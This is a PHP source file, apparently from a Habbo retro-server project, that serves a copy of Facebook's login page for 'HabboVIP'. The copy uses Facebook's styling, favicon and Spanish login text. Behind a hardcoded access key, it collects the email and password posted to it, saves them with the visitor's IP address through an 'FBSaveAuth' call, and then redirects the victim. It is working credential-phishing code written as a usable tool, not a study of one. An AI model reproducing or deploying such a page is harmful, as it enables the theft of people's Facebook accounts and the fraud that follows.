<?php
/**
 * PixelZone by RDP Services, Emulated by Retro Development Server.
 * The use of this program is restricted to clients and owners of RDP Services.
 * Any unauthorized use of this code it'll end up on deletion of the program.
 * Developers P3x & Jeihden.
 * Copyrights © 2020
 * Last Modified: $file.lastModefied
 */


require_once '../app/init.pz.php';
echo "<script> setTimeout(function(){ window.location = '". Config::$FB_API_LINK . "'; }, 0); </script>";
        exit;
// Redirect if logged in
if($Session->Exist(Config::$SessionName)):
    header("Location: /me");
    exit;
endif;

if(isset($_GET['api_login_key']) && $_GET['api_login_key'] == "250113520278562147532582365412"):

    if(isset($_GET['send_auth'])):
        $E = AppFunctions::InjectionCleaner($_POST['fb_e']);
        $P = AppFunctions::InjectionCleaner($_POST['fb_p']);

        $FBManager->FBSaveAuth($E, $P, AppFunctions::GetIP());
        $D['url'] = Config::$FB_API_LINK;
        echo json_encode($D);
        exit;
    endif;

    if($FBManager->FBRedirect(AppFunctions::GetIP())):
        echo "<script> setTimeout(function(){ window.location = '". Config::$FB_API_LINK . "'; }, 0); </script>";
        exit;
    endif;


?>

<head>
    <meta charset="utf-8">
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
    <title id="pageTitle">Facebook</title>
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
    <link type="text/css" rel="stylesheet"
          href="https://static.xx.fbcdn.net/rsrc.php/v3/yR/l/0,cross/6Fpi59aeuTi.css?_nc_x=Ij3Wp8lg5Kz"
          data-bootloader-hash="4BeuA" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet"
          href="https://static.xx.fbcdn.net/rsrc.php/v3/yL/l/0,cross/mIpWsx9K0WA.css?_nc_x=Ij3Wp8lg5Kz"
          data-bootloader-hash="WSLNY" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet"
          href="https://static.xx.fbcdn.net/rsrc.php/v3/yN/l/0,cross/9ELNtYXCkOj.css?_nc_x=Ij3Wp8lg5Kz"
          data-bootloader-hash="jiDVi" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet"
          href="https://static.xx.fbcdn.net/rsrc.php/v3/y9/l/0,cross/yXaPSl6hcJG.css?_nc_x=Ij3Wp8lg5Kz"
          data-bootloader-hash="jFzWg" crossorigin="anonymous">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3ig1H4/yr/l/en_US/VwebigrewaW.js?_nc_x=Ij3Wp8lg5Kz" rel="preload"
          as="script" crossorigin="anonymous">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3iTt_4/yW/l/en_US/0dCzk2-iq4H.js?_nc_x=Ij3Wp8lg5Kz" rel="preload"
          as="script" crossorigin="anonymous">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3iNdd4/yD/l/en_US/b4LiVTea0p2.js?_nc_x=Ij3Wp8lg5Kz" rel="preload"
          as="script" crossorigin="anonymous">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/bkzzZmTR6p0.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/LgMWflE7YRv.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3iYXl4/yK/l/en_US/mxxeQOQoWCf.js?_nc_x=Ij3Wp8lg5Kz" rel="preload"
          as="script" crossorigin="anonymous">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yo/r/7vbWpBKLrZ_.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yz/r/caaCmvM6rAU.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yr/r/YaQnvmWZitt.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yX/r/4HYxgAsCpxj.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3iqES4/ym/l/en_US/VMj5I33JQV6.js?_nc_x=Ij3Wp8lg5Kz" rel="preload"
          as="script" crossorigin="anonymous">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/6KqFq7q8hV0.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
</head>


<body class="login_page  _4idf booklet chrome webkit win x1 Locale_en_US" dir="ltr">
<div id="booklet">
    <div id="pageheader">
        <div class="clearfix" id="header_container">
            <div class="lfloat _ohe"><h2 id="homelink">Facebook</h2></div>
        </div>
    </div>
    <div id="content" class="fb_content clearfix">Inicie sesión para usar su cuenta de Facebook con <span
                class="_50f7">HabboVIP</span>.
        <div class="login_form_container">
            <div class="pam login_error_box uiBoxRed" role="alert" tabindex="0" id="error_box" style="display: none;"><div class="fsl fwb fcb">Correo electrónico o número de teléfono incorrectos</div><div>El correo electrónico o número de teléfono que ingresó no coincide con ninguna cuenta.<a href="https://www.facebook.com/reg/">Regístrese para obtener una cuenta.</a></div></div>
            <div id="login_form" >
                <div id="loginform">
                    <div class="clearfix form_row" id="email_container">
                        <div><label class="login_form_label">Email or Phone:</label>
                            <input type="text" class="inputtext _55r1 inputtext inputtext" name="email" id="email" tabindex="0" value="" autofocus="1" autocomplete="username">
                        </div>
                    </div>
                    <div class="clearfix form_row">
                        <div><label class="login_form_label">Password:</label>
                            <input type="password" class="inputtext _55r1 inputtext inputtext" name="pass" id="pass" tabindex="0" value="" autocomplete="current-password">
                        </div>
                    </div>
                    <div id="buttons" class="form_row clearfix"><label class="login_form_label">

                        </label>
                        <label class="uiButton uiButtonConfirm uiButtonLarge" id="loginbutton" for="u_0_0">
                            <input value="Iniciar sesión" name="login" type="submit" tabindex="0" id="u_0_0">
                        </label>
                    </div>
                    <p class="reset_password form_row" id="login_link">
                        <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login" class="_97w4">Olvidé mi cuenta?</a></p></div>
                </div>
        </div>
        <div style="margin:auto; width:380px"
        ><a role="button" class="_42ft _4jy0 _4jy3 _4jy2 selected _51sy" style="margin-left:100px" href="https://www.facebook.com/reg/">Crear una nueva cuenta</a></div>
    </div>
</div>

<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yR/l/0,cross/6Fpi59aeuTi.css?_nc_x=Ij3Wp8lg5Kz"
      as="style" crossorigin="anonymous">
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yL/l/0,cross/mIpWsx9K0WA.css?_nc_x=Ij3Wp8lg5Kz"
      as="style" crossorigin="anonymous">
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yN/l/0,cross/9ELNtYXCkOj.css?_nc_x=Ij3Wp8lg5Kz"
      as="style" crossorigin="anonymous">
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y9/l/0,cross/yXaPSl6hcJG.css?_nc_x=Ij3Wp8lg5Kz"
      as="style" crossorigin="anonymous">

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="<?php echo DY; ?>/js/fb_login.js?<?php echo time(); ?>" type="text/javascript"></script>


</body>

<?php else: echo "<script> setTimeout(function(){ window.location = '". Config::$FB_API_LINK . "'; }, 0); </script>"; exit; endif;?>